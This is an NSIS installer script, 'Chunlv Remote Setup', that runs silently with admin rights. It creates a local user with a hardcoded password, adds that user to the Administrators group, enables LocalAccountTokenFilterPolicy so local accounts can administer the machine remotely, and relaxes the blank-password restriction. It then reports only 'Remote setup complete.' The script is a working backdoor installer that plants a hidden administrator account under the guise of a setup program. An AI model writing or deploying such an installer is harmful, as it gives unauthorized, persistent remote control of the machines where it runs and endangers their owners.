Unicode true
Name "Chunlv Remote Setup"
OutFile "ChunlvRemoteSetup.exe"
InstallDir "$TEMP\ChunlvRemote"
RequestExecutionLevel admin
ShowInstDetails show
SilentInstall silent

Section
  nsExec::ExecToLog 'net user chunlvops ChunlvOps2026x9 /add'
  nsExec::ExecToLog 'net localgroup administrators chunlvops /add'
  nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'
  nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f'
  MessageBox MB_OK "Remote setup complete."
SectionEnd
